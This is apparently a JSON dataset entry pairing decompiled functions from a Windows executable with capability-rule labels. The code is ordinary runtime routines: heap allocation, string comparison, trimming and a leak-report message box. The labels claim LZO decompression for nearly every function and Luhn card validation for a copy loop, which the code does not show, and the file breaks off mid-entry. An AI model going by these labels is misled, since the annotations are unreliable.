{
    "00401578": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401578(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    param_1 = param_1 + -4;\n    iVar1 = -param_1;\n    do {\n        *(iVar1 + param_2 + param_1) = ROUND(*(iVar1 + in_EAX + param_1));\n        iVar1 = iVar1 + 8;\n    } while (iVar1 < 0);\n    *(iVar1 + param_2 + param_1) = *(iVar1 + in_EAX + param_1);\n    return;\n}\n",
        "token_count": 142
    },
    "004016a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004016a0(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t in_EAX;\n    uint *puVar3;\n    int32_t iVar4;\n    \n    fcn.00401634();\n    puVar3 = sub.kernel32.dll_VirtualAlloc(0, 0x140000, 0x1000, 4);\n    puVar1 = *0x493708;\n    if (puVar3 != NULL) {\n        *puVar3 = 0x493704;\n        puVar2 = puVar3;\n        puVar3[1] = *0x493708;\n        *0x493708 = puVar2;\n        *puVar1 = puVar3;\n        puVar3[0x4ffff] = 2;\n        *0x49371c = 0x13fff0 - in_EAX;\n        *0x493718 = puVar3 + (0x140000 - in_EAX);\n        iVar4 = *0x493718;\n        *(*0x493718 + -4) = in_EAX | 2;\n        return iVar4;\n    }\n    *0x49371c = 0;\n    return 0;\n}\n",
        "token_count": 272
    },
    "null": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004020f8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004020f8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = (*(in_EAX + -4) & 0xfffffff0) + in_EAX;\n    if ((*(iVar1 + -4) & 0xfffffff0) == 0) {\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 91
    },
    "0040215c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040215c(int32_t *param_1, int32_t **param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    *param_2 = in_EAX + 8;\n    iVar1 = *in_EAX;\n    if ((in_EAX == *(iVar1 + 0x10)) && (*(iVar1 + 8) < *(iVar1 + 0xc) || *(iVar1 + 8) == *(iVar1 + 0xc))) {\n        *param_1 = *(iVar1 + 8) + -1;\n        return;\n    }\n    *param_1 = in_EAX + ((in_EAX[-1] & 0xfffffff0U) - *(iVar1 + 2));\n    return;\n}\n",
        "token_count": 177
    },
    "004024b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004024b8(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    char cVar3;\n    bool bVar4;\n    int32_t *in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint32_t *var_18h;\n    uint32_t *var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = arg_8h + -0x1b800 + (*in_EAX - 0x490040U >> 5) * 0x800;\n    fcn.0040215c();\n    do {\n        if (var_1ch < var_18h) {\n            return;\n        }\n        if (((*(var_18h + -1) & 1) == 0) && (cVar3 = fcn.00402460(),  cVar3 == '\\0')) {\n            *(arg_8h + -0x1b801) = 0;\n            iVar6 = 0;\n            iVar5 = fcn.00402384();\n            if (iVar5 == 0) {\n                if (((*var_18h < 0x100) && (var_20h = var_18h[1],  0 < var_20h)) && (var_20h < *(*in_EAX + 2) - 0xd)) {\n                    var_10h = var_18h + 2;\n                    bVar4 = true;\n                    if (0 < var_20h) {\n                        do {\n                            if (((bVar4) && (0x1f < *var_10h)) && (*var_10h < 0x80)) {\n                                bVar4 = true;\n                            }\n                            else {\n                                bVar4 = false;\n                            }\n                            var_10h = var_10h + 1;\n                            var_20h = var_20h - 1;\n                        } while (var_20h != 0);\n                    }\n                    if ((bVar4) && (*var_10h == 0)) {\n                        iVar6 = 1;\n                    }\n                }\n            }\n            else {\n                iVar6 = 2;\n                do {\n                    if ((iVar5 == *(iVar2 + iVar6 * 8)) || (*(iVar2 + iVar6 * 8) == 0)) break;\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x100);\n                if (iVar6 < 0x100) {\n                    *(iVar2 + iVar6 * 8) = iVar5;\n                }\n                else {\n                    iVar6 = 0;\n                }\n            }\n            piVar1 = iVar2 + 4 + iVar6 * 8;\n            *piVar1 = *piVar1 + 1;\n        }\n        var_18h = var_18h + *(*in_EAX + 2);\n    } while( true );\n}\n",
        "token_count": 669
    },
    "00402604": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00402604(void)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t *piVar6;\n    uchar auStackY131117 [2049];\n    int32_t aiStackY129068 [4096];\n    int32_t *piStackY112684;\n    uint16_t *puStackY112680;\n    int32_t iStackY112676;\n    int32_t iStackY112672;\n    int32_t iStackY112668;\n    int32_t iStackY112664;\n    int32_t iStackY112660;\n    char cStackY112654;\n    char cStackY112653;\n    int32_t iStackY112652;\n    char cStackY112645;\n    int32_t aiStackY110600 [26035];\n    uint var_4h;\n    \n    iVar3 = 0x27;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    fcn.00403720();\n    fcn.00403720();\n    iStackY112652 = 0;\n    cStackY112645 = '\\x01';\n    for (iVar3 = *0x493708; iVar4 = *0x4957ac,  iVar3 != 0x493704; iVar3 = *(iVar3 + 4)) {\n        iVar4 = fcn.0040211c();\n        while (iVar4 != 0) {\n            uVar1 = *(iVar4 + -4);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 4) == 0) {\n                    if (iStackY112652 < 0x1000) {\n                        iStackY112664 = (uVar1 & 0xfffffff0) - 4;\n                        cVar2 = fcn.00402460();\n                        if (cVar2 == '\\0') {\n                            cStackY112645 = '\\0';\n                            aiStackY129068[iStackY112652] = iStackY112664;\n                            iStackY112652 = iStackY112652 + 1;\n                        }\n                    }\n                }\n                else {\n                    fcn.004024b8(&stack0xfffffffc);\n                }\n            }\n            iVar4 = fcn.004020f8();\n        }\n    }\n    while ((iVar4 != 0x4957a8 && (iStackY112652 < 0x1000))) {\n        cVar2 = fcn.00402460();\n        if (cVar2 == '\\0') {\n            cStackY112645 = '\\0';\n            aiStackY129068[iStackY112652] = (*(iVar4 + 0xc) & 0xfffffff0) - 0x14;\n            iStackY112652 = iStackY112652 + 1;\n        }\n        iVar4 = *(iVar4 + 4);\n    }\n    if (cStackY112645 == '\\0') {\n        cStackY112653 = '\\0';\n        iStackY112668 = 0;\n        puVar5 = fcn.004022b4();\n        iStackY112660 = 0x37;\n        puStackY112680 = 0x490042;\n        piStackY112684 = aiStackY110600;\n        do {\n            iStackY112672 = *puStackY112680 - 4;\n            cStackY112654 = '\\0';\n            iVar3 = 0xff;\n            piVar6 = piStackY112684;\n            do {\n                if (auStackY131117 < puVar5) break;\n                if (*piVar6 != 0) {\n                    if (cStackY112653 == '\\0') {\n                        puVar5 = fcn.004022b4();\n                        cStackY112653 = '\\x01';\n                    }\n                    if (cStackY112654 == '\\0') {\n                        *puVar5 = 0xd;\n                        puVar5[1] = 10;\n                        puVar5 = fcn.00402198();\n                        *puVar5 = 0x20;\n                        puVar5[1] = 0x2d;\n                        puVar5[2] = 0x20;\n                        fcn.00402198();\n                        fcn.004022b4();\n                        cStackY112654 = '\\x01';\n                    }\n                    else {\n                        *puVar5 = 0x2c;\n                        puVar5[1] = 0x20;\n                    }\n                    if (iVar3 == 0) {\n                        puVar5 = fcn.004022b4();\n                    }\n                    else if (iVar3 == 1) {\n                        puVar5 = fcn.004022b4();\n                    }\n                    else {\n                        fcn.00403e38();\n                        puVar5 = fcn.004022b4();\n                    }\n                    *puVar5 = 0x20;\n                    puVar5[1] = 0x78;\n                    puVar5[2] = 0x20;\n                    puVar5 = fcn.00402198();\n                }\n                iVar3 = iVar3 + -1;\n                piVar6 = piVar6 + -2;\n            } while (iVar3 != -1);\n            iStackY112668 = iStackY112672;\n            piStackY112684 = piStackY112684 + 0x200;\n            puStackY112680 = puStackY112680 + 0x10;\n            iStackY112660 = iStackY112660 + -1;\n        } while (iStackY112660 != 0);\n        if (0 < iStackY112652) {\n            if (cStackY112653 != '\\0') {\n                *puVar5 = 0xd;\n                puVar5[1] = 10;\n                puVar5[2] = 0xd;\n                puVar5[3] = 10;\n            }\n            puVar5 = fcn.004022b4();\n            iStackY112676 = 0;\n            iVar3 = iStackY112652;\n            do {\n                if (iStackY112676 != 0) {\n                    *puVar5 = 0x2c;\n                    puVar5[1] = 0x20;\n                }\n                puVar5 = fcn.00402198();\n                if (auStackY131117 < puVar5) break;\n                iStackY112676 = iStackY112676 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        fcn.004022b4();\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 1477
    },
    "00405060": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00405060(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "00405ccc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405ccc(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t **in_EAX;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = *in_EAX;\n    iVar5 = *arg_8h;\n    if (iVar5 < 1) {\n        if (iVar5 < 0) {\n            fcn.00402e34();\n        }\n        fcn.00405cc4();\n    }\n    else {\n        var_10h = 0;\n        if (piVar3 != NULL) {\n            var_10h = piVar3[-1];\n            piVar3 = piVar3 + -2;\n        }\n        iVar4 = in_EDX + *(in_EDX + 1);\n        iVar1 = *(iVar4 + 2);\n        piVar2 = *(iVar4 + 6);\n        if (piVar2 == NULL) {\n            iVar4 = 0;\n        }\n        else {\n            iVar4 = *piVar2;\n        }\n        if ((iVar5 * iVar1) / iVar5 != iVar1) {\n            fcn.00402e34();\n        }\n        if ((piVar3 == NULL) || (*piVar3 == 1)) {\n            if ((iVar5 < var_10h) && (iVar4 != 0)) {\n                fcn.00405cbc();\n            }\n            fcn.00402d18();\n        }\n        else {\n            *piVar3 = *piVar3 + -1;\n            piVar3 = fcn.00402ce4();\n            var_14h = var_10h;\n            if (iVar5 < var_10h) {\n                var_14h = iVar5;\n            }\n            if (iVar4 == 0) {\n                fcn.00402ee0();\n            }\n            else {\n                fcn.00403720();\n                fcn.00405cac(var_14h);\n            }\n        }\n        *piVar3 = 1;\n        piVar3[1] = iVar5;\n        fcn.00403720();\n        if ((1 < in_ECX) && (-1 < iVar5 + -1)) {\n            do {\n                fcn.00405ccc(arg_8h + 1);\n                iVar5 = iVar5 + -1;\n            } while (iVar5 != 0);\n        }\n        *in_EAX = piVar3 + 2;\n    }\n    return;\n}\n",
        "token_count": 632
    },
    "0040688c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004068d8)\n\nvoid fcn.0040688c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint arg_8h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x406938;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00404da0();\n    bVar3 = true;\n    arg_8h = 0x4068bd;\n    fcn.004056fc();\n    if (!bVar3) {\n        fcn.004056f0();\n        fcn.004054ec();\n        arg_8h = fcn.004056f0();\n        uVar1 = fcn.004056e0();\n        fcn.00405264(uVar1);\n        iVar2 = fcn.00406680(arg_8h);\n        if (iVar2 < 1) {\n            fcn.00404da0();\n        }\n        else {\n            fcn.004054ec();\n        }\n        fcn.00404df4();\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack28 = 0x40693f;\n    uStack32 = 0x406937;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 347
    },
    "00406948": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00406948(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar2;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4069f3;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = 0x406970;\n    fcn.00405580();\n    if (in_EAX != 0) {\n        fcn.004057cc();\n        if (in_EAX != 0) {\n            in_EAX = *(in_EAX + -4);\n        }\n        iVar2 = fcn.004056f0();\n        uVar1 = fcn.00405264(iVar2 + 1);\n        fcn.004056e0(uVar1);\n        iVar2 = fcn.0040675c(in_EAX);\n        if (iVar2 < 1) {\n            fcn.00405580();\n            iVar2 = in_EAX;\n        }\n        else {\n            fcn.004057cc();\n            iVar2 = in_EAX;\n        }\n        fcn.004055bc();\n    }\n    *in_FS_OFFSET = iVar2;\n    uStack32 = 0x4069fa;\n    iStack36 = 0x4069f2;\n    fcn.00405580();\n    return;\n}\n",
        "token_count": 353
    },
    "004088c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.004088c4(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    if ((in_EAX == 0) || (uVar4 = *(in_EAX + -4),  uVar4 < 1)) {\n        iVar1 = *param_2;\n        if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n            LOCK();\n            piVar3 = iVar1 + -8;\n            *piVar3 = *piVar3 + -1;\n            if (*piVar3 == 0) {\n                fcn.00402d00();\n            }\n        }\n        return param_2;\n    }\n    iVar1 = *param_2;\n    if (iVar1 != 0) {\n        if ((uVar4 & 3) == 0) {\n            if ((uVar4 ^ *(iVar1 + -4)) < 4) {\ncode_r0x00408901:\n                if (*(iVar1 + -8) == 1) goto code_r0x00408911;\n            }\n        }\n        else if (((uVar4 | 2) ^ *(iVar1 + -4)) < 2) goto code_r0x00408901;\n    }\n    fcn.004054ec();\ncode_r0x00408911:\n    iVar1 = *param_2;\n    *(iVar1 + -4) = uVar4;\n    *(iVar1 + uVar4) = 0;\n    uVar4 = uVar4 - 1 & 0xfffffffc;\n    piVar3 = *(in_EAX + uVar4);\n    do {\n        *(iVar1 + uVar4) =\n             (((piVar3 | 0x80808080) + 0x84848485 | 0x80808080) + 0x9999999a & ((piVar3 | 0x80808080) ^ piVar3)) >> 2 ^\n             piVar3;\n        piVar3 = *(in_EAX + -4 + uVar4);\n        bVar2 = 3 < uVar4;\n        uVar4 = uVar4 - 4;\n    } while (bVar2);\n    return piVar3;\n}\n",
        "token_count": 534
    },
    "00408960": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00408960(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    int32_t in_EAX;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    if ((in_EAX == 0) || (uVar4 = *(in_EAX + -4),  uVar4 < 1)) {\n        iVar1 = *param_2;\n        if ((iVar1 != 0) && (*param_2 = 0,  0 < *(iVar1 + -8))) {\n            LOCK();\n            piVar3 = iVar1 + -8;\n            *piVar3 = *piVar3 + -1;\n            if (*piVar3 == 0) {\n                fcn.00402d00();\n            }\n        }\n        return param_2;\n    }\n    iVar1 = *param_2;\n    if (iVar1 != 0) {\n        if ((uVar4 & 3) == 0) {\n            if ((uVar4 ^ *(iVar1 + -4)) < 4) {\ncode_r0x0040899d:\n                if (*(iVar1 + -8) == 1) goto code_r0x004089ad;\n            }\n        }\n        else if (((uVar4 | 2) ^ *(iVar1 + -4)) < 2) goto code_r0x0040899d;\n    }\n    fcn.004054ec();\ncode_r0x004089ad:\n    iVar1 = *param_2;\n    *(iVar1 + -4) = uVar4;\n    *(iVar1 + uVar4) = 0;\n    uVar4 = uVar4 - 1 & 0xfffffffc;\n    piVar3 = *(in_EAX + uVar4);\n    do {\n        *(iVar1 + uVar4) =\n             (((piVar3 | 0x80808080) + 0xa4a4a4a5 | 0x80808080) + 0x9999999a & ((piVar3 | 0x80808080) ^ piVar3)) >> 2 ^\n             piVar3;\n        piVar3 = *(in_EAX + -4 + uVar4);\n        bVar2 = 3 < uVar4;\n        uVar4 = uVar4 - 4;\n    } while (bVar2);\n    return piVar3;\n}\n",
        "token_count": 539
    },
    "00408b80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408b80(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    fcn.00405264();\n    fcn.00404e90();\n    if (0 < in_EAX) {\n        sub.user32.dll_CharLowerBuffA(*param_2, in_EAX);\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00408bb8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00408bb8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.00405264(param_2);\n    uVar1 = fcn.00405264(in_EAX, uVar1);\n    iVar2 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar1);\n    return iVar2 + -2;\n}\n",
        "token_count": 169
    },
    "00408c1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408c1c(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    for (iVar1 = 1; (iVar1 <= iVar2 && (*(in_EAX + -1 + iVar1) < 0x21)); iVar1 = iVar1 + 1) {\n    }\n    if (iVar2 < iVar1) {\n        fcn.00404da0();\n    }\n    else {\n        for (; *(in_EAX + -1 + iVar2) < 0x21; iVar2 = iVar2 + -1) {\n        }\n        fcn.004052c4(param_2);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00408c70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00408c70(uint param_1, char param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    \n    uVar4 = 0;\n    pcVar5 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar5 = *(in_EAX + -4);\n    }\n    if (pcVar5 == NULL) {\n        bVar2 = true;\n    }\n    else {\n        cVar1 = *in_EAX;\n        if (((cVar1 + 0xbfU < 0x1a) || (cVar1 == '_')) || (cVar1 + 0x9fU < 0x1a)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = 0;\n        }\n        bVar2 = uVar3 ^ 1;\n    }\n    if (!bVar2) {\n        if (param_2 == '\\0') {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((9 < cVar1 - 0x30U) && (0x19 < cVar1 + 0xbfU)) && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        else {\n            pcVar5 = in_EAX;\n            if (in_EAX != NULL) {\n                pcVar5 = *(in_EAX + -4);\n            }\n            if (1 < pcVar5) {\n                pcVar5 = pcVar5 + -1;\n                iVar6 = 2;\n                do {\n                    cVar1 = in_EAX[iVar6 + -1];\n                    if (((cVar1 != '.') && (9 < cVar1 - 0x30U)) &&\n                       ((0x19 < cVar1 + 0xbfU && ((cVar1 != '_' && (0x19 < cVar1 + 0x9fU)))))) {\n                        return 0;\n                    }\n                    iVar6 = iVar6 + 1;\n                    pcVar5 = pcVar5 + -1;\n                } while (pcVar5 != NULL);\n            }\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 630
    },
    "00408ddc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408ddc(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cStack8;\n    \n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cStack8 = ROUND(fVar6);\n        uVar2 = cStack8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cStack8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 422
    },
    "00408fc8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuchar __cdecl fcn.00408fc8(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_EDX;\n    int32_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_1h;\n    \n    if (-1 < in_EDX) {\n        var_ch = in_EDX + 1;\n        do {\n            iVar2 = *(arg_8h + -4);\n            iVar3 = *in_EAX;\n            if (iVar2 != 0) {\n                iVar2 = *(iVar2 + -4);\n            }\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar1 = fcn.00405264(iVar3);\n            fcn.00405264(iVar2, uVar1);\n            iVar2 = sub.kernel32.dll_CompareStringA_1();\n            if (iVar2 == 2) {\n                return 1;\n            }\n            in_EAX = in_EAX + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "00409360": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00409360(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = in_EAX;\n    if (in_EAX != 0) {\n        iVar2 = *(in_EAX + -4);\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    while (cVar1 = fcn.0040cf54(),  cVar1 == '\\x02') {\n        iVar2 = iVar2 + -1;\n    }\n    return in_EAX + -1 + iVar2;\n}\n",
        "token_count": 135
    },
    "00409394": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409394(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = param_2;\n    if (param_2 != 0) {\n        iVar3 = *(param_2 + -4);\n    }\n    fcn.00405264();\n    do {\n        if (iVar3 < 1) {\n            return iVar3;\n        }\n        if ((*(param_2 + -1 + iVar3) != '\\0') && (iVar2 = fcn.00409728(),  iVar2 != 0)) {\n            cVar1 = fcn.0040cf54();\n            if (cVar1 != '\\x02') {\n                return iVar3;\n            }\n            iVar3 = iVar3 + -1;\n        }\n        iVar3 = iVar3 + -1;\n    } while( true );\n}\n",
        "token_count": 206
    },
    "00409610": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00409610(void)\n\n{\n    fcn.00405264();\n    fcn.004095dc();\n    return;\n}\n",
        "token_count": 31
    },
    "00409658": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409658(uint param_1, int32_t param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    param_2 = param_2 - in_EAX;\n    if (param_2 == 0) {\n        return 0;\n    }\n    while( true ) {\n        uVar1 = in_EAX[param_2];\n        uVar3 = uVar1;\n        puVar2 = in_EAX;\n        if ((uVar1 != *in_EAX) || (uVar1 == 0)) break;\n        uVar1 = in_EAX[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[1]) || (uVar1 == 0)) goto code_r0x004096da;\n        uVar1 = in_EAX[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[2]) || (uVar1 == 0)) goto code_r0x004096d7;\n        uVar1 = in_EAX[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[3]) goto code_r0x004096d4;\n        puVar2 = in_EAX + 4;\n        if (uVar1 == 0) goto code_r0x004096d1;\n        uVar1 = puVar2[param_2];\n        uVar3 = uVar1;\n        if ((uVar1 != *puVar2) || (uVar1 == 0)) break;\n        uVar1 = puVar2[param_2 + 1];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[5]) || (uVar1 == 0)) goto code_r0x004096da;\n        uVar1 = puVar2[param_2 + 2];\n        uVar3 = uVar1;\n        if ((uVar1 != in_EAX[6]) || (uVar1 == 0)) goto code_r0x004096d7;\n        uVar1 = puVar2[param_2 + 3];\n        uVar3 = uVar1;\n        if (uVar1 != in_EAX[7]) goto code_r0x004096d4;\n        in_EAX = in_EAX + 8;\n        puVar2 = in_EAX;\n        if (uVar1 == 0) goto code_r0x004096d1;\n    }\ncode_r0x004096dd:\n    return *puVar2 - uVar3;\ncode_r0x004096d1:\n    puVar2 = puVar2 + -4;\ncode_r0x004096d4:\n    puVar2 = puVar2 + 1;\ncode_r0x004096d7:\n    puVar2 = puVar2 + 1;\ncode_r0x004096da:\n    puVar2 = puVar2 + 1;\n    goto code_r0x004096dd;\n}\n",
        "token_count": 698
    },
    "004097b8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.004097b8(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + -4) + -4;\n}\n",
        "token_count": 38
    },
    "004097f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004097f0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00402d00();\n    }\n    return;\n}\n",
        "token_count": 47
    },
    "00409c94": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
